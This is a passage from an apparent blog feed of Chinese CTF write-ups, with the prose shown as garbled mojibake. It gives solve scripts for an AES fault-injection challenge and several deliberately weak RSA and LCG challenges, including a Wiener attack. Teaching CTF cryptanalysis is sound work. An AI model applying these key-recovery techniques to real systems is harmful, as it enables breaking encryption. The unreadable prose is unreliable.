class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>):<br>        x, y = i % <span class="hljs-number">4</span>, i // <span class="hljs-number">4</span> <br>        result = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>):<br>            result ^= (mul(matrix[x * <span class="hljs-number">4</span> + j], <span class="hljs-built_in">int</span>(m_row[y * <span class="hljs-number">4</span> + j], <span class="hljs-number">16</span>)))<br>        result = mod(result)<br>        m_col.append(<span class="hljs-built_in">hex</span>(result))<br>    <span class="hljs-keyword">return</span> m_col<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_zero_rotate</span>():<br>    key_rotate = [[<span class="hljs-string">&#x27;0x00&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>)]<br>    <span class="hljs-keyword">return</span> key_rotate<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">c, key_rotate</span>):<br>    c_hex = [<span class="hljs-string">&#x27;0x&#x27;</span> + c[i * <span class="hljs-number">2</span>] + c[i * <span class="hljs-number">2</span> + <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>)] <span class="hljs-comment">#å°†å¯†æ–‡æ¢å¤ä¸ºåˆ—è¡¨</span><br>    c_xor = xor(c_hex, key_rotate[<span class="hljs-number">10</span>])<br>    c_row = shiftrows(c_xor, inverse=<span class="hljs-literal">True</span>)<br>    c_s = substitute(c_row, inverse=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> rotate <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>): <span class="hljs-comment">#å¾ªç¯9æ¬¡</span><br>        c_xor = xor(c_s, key_rotate[rotate])<br>        c_col = mixcolumn(c_xor, inverse=<span class="hljs-literal">True</span>)<br>        c_row = shiftrows(c_col, inverse=<span class="hljs-literal">True</span>)<br>        c_s = substitute(c_row, inverse=<span class="hljs-literal">True</span>)<br>    plain_bytes = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">int</span>(x, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xor(c_s, key_rotate[<span class="hljs-number">0</span>]))<br>    <span class="hljs-keyword">return</span> plain_bytes.<span class="hljs-built_in">hex</span>() <br></code></pre></td></tr></table></figure><p>ç ´è§£è„šæœ¬<code>ans.py</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> websocket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> aes<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br>url = <span class="hljs-string">&quot;wss://www.nepctf.com/api/traffic/Cb0Tcf4XIXmHG8dG1tqVI?port=9999&quot;</span><br>ws = websocket.create_connection(url, sslopt=&#123;<span class="hljs-string">&quot;cert_reqs&quot;</span>: ssl.CERT_NONE&#125;)<br><br>prompt = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Server says:&quot;</span>, prompt.decode())<br><br>plaintext = <span class="hljs-string">&quot;00112233445566778899aabbccddeeff&quot;</span><br>ws.send(plaintext+<span class="hljs-string">&quot;\n&quot;</span>)<br>msg = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg=&quot;</span>,msg)<br>ws.send(<span class="hljs-string">&quot;90\n&quot;</span>)<br><br>shock = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg1=&quot;</span>,shock.decode())<br>msg2 = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg2=&quot;</span>,msg2)<br>msg3 = ws.recv().decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg3=&quot;</span>,msg3)<br>cipher = re.search(<span class="hljs-string">r&#x27;([0-9a-fA-F]&#123;32&#125;)&#x27;</span>, msg3).group(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cipher=&quot;</span>,cipher)<br><br><span class="hljs-comment">#ä½¿ç”¨çº¯0è½®å¯†é’¥è§£å¯†</span><br>rotate_key = aes.key_zero_rotate()<br>plain = aes.aes_decrypt(cipher,rotate_key)<br><br>key = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(plaintext,<span class="hljs-number">16</span>) ^ <span class="hljs-built_in">int</span>(plain,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;key=&quot;</span>,key)<br>ws.send(key+<span class="hljs-string">&quot;\n&quot;</span>)<br>msg4 = ws.recv().decode()<br><span class="hljs-built_in">print</span>(msg4)<br><br>ws.close()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè·å–<code>FLAG</code>ï¼Œæç¤ºä¸€ä¸‹ï¼Œç”±äºæˆ‘ä»¬çš„æ•…éšœæ³¨å…¥å¹¶ä¸èƒ½ä¿è¯æ¯”ç‰¹ç¿»è½¬åçš„<code>i</code>ä¸€å®šå¤§äº44ï¼Œå› æ­¤éœ€è¦å¤šå°è¯•å‡ æ¬¡æ‰èƒ½è·å¾—flagã€‚<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250808015443760.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¾ŠåŸæ¯ 2023 Wpï¼ˆå¤ç°ï¼‰</title>
    <link href="/2025/07/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <url>/2025/07/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Wp%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>NSSåˆ·é¢˜å¤ç°ç¬”è®°ï¼Œè¿‡ç¨‹å†™çš„å¯èƒ½æ¯”è¾ƒç®€å•ï¼Œæœ‰é—®é¢˜æ¬¢è¿æŒ‡å‡ºäº¤æµ(ãƒ»âˆ€ãƒ»)ã¤â‘©</p><h1 id="esyRSA"><a href="#esyRSA" class="headerlink" title="esyRSA"></a>esyRSA</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> md5 <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> p, q<br><br>e = ?????<br>n = p*q<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = invert(e, phi)<br>ans = gcd(e,phi)<br><br><span class="hljs-built_in">print</span> n, e, d<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="hljs-built_in">str</span>(p + q)).hexdigest()<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n = 8064259277274639864655809758868795854117113170423331934498023294296505063511386001711751916634810056911517464467899780578338013011453082479880809823762824723657495915284790349150975180933698827382368698861967973964030509129133021116919437755292590841218316278732797712538885232908975173746394816520256585937380642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span><br><span class="hljs-string">d = 14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>ç»´çº³æ”»å‡»ï¼ŒæŠŠdå½“ä½œåŸæœ¬çš„eå°±è¡Œï¼Œè¿›è¡Œè¿åˆ†æ•°å±•å¼€ä¾¿èƒ½æ±‚è§£ã€‚<br>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ¬é¢˜é™„ä»¶å­˜åœ¨é—®é¢˜ï¼Œnçš„çœŸå®æ•°å­—åœ¨é™„ä»¶ä¸­é‡å¤äº†ä¸¤éï¼Œè¦æ‰‹åŠ¨åˆ å»(ï¼â€µĞ”â€²)ï¼~ â•§â•§<br><strong>é¢˜è§£ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wiener</span>(<span class="hljs-params">N:<span class="hljs-built_in">int</span>, d:<span class="hljs-built_in">int</span>, debug = <span class="hljs-literal">True</span></span>):<br>    N = Integer(N)<br>    d = Integer(d)<br>    cf = (d / N).continued_fraction().convergents()<br>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> cf:<br>        k = f.numer()<br>        e = f.denom()<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi_N = <span class="hljs-built_in">int</span>(ceil((e * d / k) - <span class="hljs-number">1</span>))<br>        b = -(N - phi_N + <span class="hljs-number">1</span>)<br>        delta = b ^ <span class="hljs-number">2</span> - <span class="hljs-number">4</span> * N<br>        <span class="hljs-keyword">if</span> delta &gt;= <span class="hljs-number">0</span>:<br>            delta_sqrt = sqrt(delta)<br>            p = (-b + delta_sqrt) / <span class="hljs-number">2</span><br>            q = (-b - delta_sqrt) / <span class="hljs-number">2</span><br>            <span class="hljs-keyword">if</span> p.is_integer() <span class="hljs-keyword">and</span> q.is_integer() <span class="hljs-keyword">and</span> (p * q) % N == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> debug:<br>                    p = <span class="hljs-built_in">int</span>(p % N)<br>                    q = <span class="hljs-built_in">int</span>(q % N)<br>                    <span class="hljs-keyword">return</span> p, q<br>n = <span class="hljs-number">80642592772746398646558097588687958541171131704233319344980232942965050635113860017117519166348100569115174644678997805783380130114530824798808098237628247236574959152847903491509751809336988273823686988619679739640305091291330211169194377552925908412183162787327977125388852329089751737463948165202565859373</span><br>d = <span class="hljs-number">14218766449983537783699024084862960813708451888387858392014856544340557703876299258990323621963898510226357248200187173211121827541826897886277531706124228848229095880229718049075745233893843373402201077890407507625110061976931591596708901741146750809962128820611844426759462132623616118530705745098783140913</span><br><br>p,q = wiener(n,d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag: DASCTF&#123;%s&#125;&quot;</span> %md5(<span class="hljs-built_in">str</span>(p + q).encode()).hexdigest())<br></code></pre></td></tr></table></figure><h1 id="Danger-RSA"><a href="#Danger-RSA" class="headerlink" title="Danger_RSA"></a>Danger_RSA</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>m = bytes_to_long(flag)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>(<span class="hljs-params">a, nbit</span>):<br>    <span class="hljs-keyword">assert</span> a &gt;= <span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        X = getRandomInteger(nbit // a)<br>        s = getRandomRange(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, a ** <span class="hljs-number">2</span> - a + <span class="hljs-number">4</span>), <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, a ** <span class="hljs-number">2</span> - a + <span class="hljs-number">5</span>))<br>        p = X ** a + s<br>        <span class="hljs-keyword">if</span> isPrime(p):<br>            <span class="hljs-keyword">return</span> (p, s)<br><br><br>p, s = get_key(a, <span class="hljs-number">1024</span>)<br>q, t = get_key(a, <span class="hljs-number">1024</span>)<br><br>N = p * q<br>e = s * t<br>c = <span class="hljs-built_in">pow</span>(m, e, N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;N =&quot;</span>, N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><span class="hljs-comment"># N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span><br><span class="hljs-comment"># e = 11079917583</span><br><span class="hljs-comment"># c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>å·²çŸ¥<code>X = getRandomInteger(nbit // a)</code>ï¼Œåˆ™æœ‰$2\leq a \leq 1024$<br>å·²çŸ¥<code>s = getRandomRange(pow(2, a ** 2 - a + 4), pow(2, a ** 2 - a + 5))</code>ï¼Œåˆ™æœ‰$2^{a^2-a+4}\leq s \leq 2^{a^2-a+5}$<br>åŒæ—¶eåˆ†è§£å¯ä»¥å¾—åˆ°$e &#x3D; 3\cdot 7 \cdot 7 \cdot 19 \cdot 691 \cdot 5741ï¼Œä¸”2^{33}\leq e \leq 2^{34}$<br>å°è¯•ä¸åŒçš„açš„å€¼ï¼š</p><ul><li>a&#x3D;2æ—¶ï¼Œ$2^4\leq s \leq 2^5$</li><li>a&#x3D;3æ—¶ï¼Œ$2^{10} \leq s \leq 2^{11}$</li><li>a&#x3D;4æ—¶ï¼Œ$2^{16}\leq s \leq 2^{17}$<br>ç»“åˆeçš„å–å€¼èŒƒå›´ï¼Œå¯ä»¥å¾—åˆ°$a&#x3D;4$<br>ä¹‹åå¯¹eçš„å› å­è¿›è¡Œæ’åˆ—ç»„åˆæ‹†æˆä¸¤ç»„ï¼Œå¯ä»¥å‘ç°æœ‰ä¸¤ç§ç»„åˆ</li><li>$s &#x3D; 5741\cdot 19,t&#x3D;691\cdot 3 \cdot 7 \cdot 7$</li><li>$s&#x3D;5741\cdot 3 \cdot 7,t&#x3D;691\cdot 7 \cdot 19$<br>$\therefore N&#x3D;(X_1^4+s)(X_2^4+t)$<br>$\because X_1^4X_2^4 &gt;&gt; tX_1^4+sX_2^4+st$<br>$\therefore gmpy2.iroot(N,4)[0] &#x3D; X_1X_2$<br>$\therefore$ä¸¤ä¸ªæœªçŸ¥æ•°ä¸¤ä¸ªæ–¹ç¨‹ï¼Œåˆ—æ–¹ç¨‹ç»„æ±‚è§£å³å¯å¾—åˆ°$p,q$<br>ä½†æ˜¯åç»­æ±‚è§£å‡º$p,q$åä¼šå‘ç°$e$å’Œ$phi$ä¸äº’ç´ ï¼Œåæ¥å°è¯•åå‘ç°$3|(p-1),7|(q-1)$ï¼Œç”±äºæ˜æ–‡çš„æ¯”ç‰¹ä¸€èˆ¬ä¸ä¼šå¤§äº$p$çš„1024æ¯”ç‰¹ï¼Œå› æ­¤å°è¯•åœ¨æ¨¡$p$ä¸‹æ±‚è§£ï¼Œå°†$m^3$å½“ä½œæ•´ä½“ï¼Œæ±‚$d&#x3D;invert(e&#x2F;&#x2F;3,p-1)$ï¼Œæœ€åæ±‚å‡º$m^3$å†åœ¨æ¨¡$p$ä¸‹æ±‚æ ¹å³å¯ã€‚<br><strong>è§£ç­”ï¼š</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> symbols, Eq, solve<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> totient<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>N = <span class="hljs-number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span><br>e = <span class="hljs-number">11079917583</span><br>c = <span class="hljs-number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span><br><br>x, y = symbols(<span class="hljs-string">&#x27;x y&#x27;</span>, real=<span class="hljs-literal">True</span>, positive=<span class="hljs-literal">True</span>)<br>S = [<span class="hljs-number">5741</span>*<span class="hljs-number">19</span>,<span class="hljs-number">5741</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7</span>]<br>T = [<span class="hljs-number">691</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7</span>*<span class="hljs-number">7</span>,<span class="hljs-number">691</span>*<span class="hljs-number">19</span>*<span class="hljs-number">7</span>]<br><span class="hljs-keyword">for</span> s,t <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(S,T):<br>    <span class="hljs-comment">#print(s*t)</span><br>    eq1 = Eq((x**<span class="hljs-number">4</span>+s)*(y**<span class="hljs-number">4</span>+t), N)<br>    eq2 = Eq(x*y,gmpy2.iroot(N,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>])<br><br>    sol = solve((eq1, eq2), (x, y))<br>    <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> sol:<br>        a = <span class="hljs-built_in">int</span>(root[<span class="hljs-number">0</span>])<br>        b = <span class="hljs-built_in">int</span>(root[<span class="hljs-number">1</span>])<br>        p = <span class="hljs-built_in">int</span>(a**<span class="hljs-number">4</span>+s)<br>        q = <span class="hljs-built_in">int</span>(b**<span class="hljs-number">4</span>+t)<br>        <span class="hljs-keyword">if</span> a &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> b &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> p*q == N:<br>            <span class="hljs-comment">#print(sol)</span><br>            <span class="hljs-comment">#print(s,t)</span><br>            <span class="hljs-comment">#print(p,q)</span><br>            <span class="hljs-comment">#è½¬ä¸ºåœ¨æ¨¡pä¸‹æ±‚è§£</span><br>            phi = p-<span class="hljs-number">1</span><br>            g = gmpy2.gcd(e,phi)<br>            t = e//g<br>            d = gmpy2.invert(t,phi)<br>            <span class="hljs-comment">#print(g)</span><br>            m3 = <span class="hljs-built_in">pow</span>(c,d,p)<br>            P.&lt;m&gt; = PolynomialRing(Zmod(p))<br>            f = m^<span class="hljs-number">3</span> - m3<br>            roots = f.roots()<br>            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> roots:<br>                m_can = <span class="hljs-built_in">int</span>(r[<span class="hljs-number">0</span>])<br>                ans = long_to_bytes(m_can)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;CTF&#x27;</span> <span class="hljs-keyword">in</span> ans:<br>                    <span class="hljs-built_in">print</span>(ans)<br>                    exit()<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="Easy-3L"><a href="#Easy-3L" class="headerlink" title="Easy_3L"></a>Easy_3L</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>m = bytes_to_long(flag)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>():<br>    p = getPrime(<span class="hljs-number">1400</span>)<br>    f = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        q = getPrime(<span class="hljs-number">512</span>)<br>        <span class="hljs-keyword">if</span> gcd(f, q) != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    h = (invert(f, p) * q) % p<br>    <span class="hljs-keyword">return</span> p, h<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt1</span>(<span class="hljs-params">m</span>):<br>    a = getPrime(<span class="hljs-number">250</span>)<br>    b = getRandomNBitInteger(<span class="hljs-number">240</span>)<br>    n = getPrime(<span class="hljs-number">512</span>)<br>    seed = m<br>    s = [<span class="hljs-number">0</span>] * <span class="hljs-number">6</span><br>    s[<span class="hljs-number">0</span>] = seed<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):<br>        s[i] = (s[i - <span class="hljs-number">1</span>] * a + b) % n<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt2</span>(<span class="hljs-params">msg, p, h</span>):<br>    s = getRandomNBitInteger(<span class="hljs-number">512</span>)<br>    c = (s * h + msg) % p<br>    <span class="hljs-keyword">return</span> c<br><br><br>s = encrypt1(m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S1 =&quot;</span>, s[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S2 =&quot;</span>, s[<span class="hljs-number">2</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S4 =&quot;</span>, s[<span class="hljs-number">4</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;S5 =&quot;</span>, s[<span class="hljs-number">5</span>])<br><br>p, h = get_key()<br>c = encrypt2(s[<span class="hljs-number">3</span>], p, h)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p =&quot;</span>, p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;h =&quot;</span>, h)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, c)<br><br><span class="hljs-comment"># S1 = 28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span><br><span class="hljs-comment"># S2 = 1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span><br><span class="hljs-comment"># S4 = 9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span><br><span class="hljs-comment"># S5 = 9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span><br><span class="hljs-comment"># p = 25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span><br><span class="hljs-comment"># h = 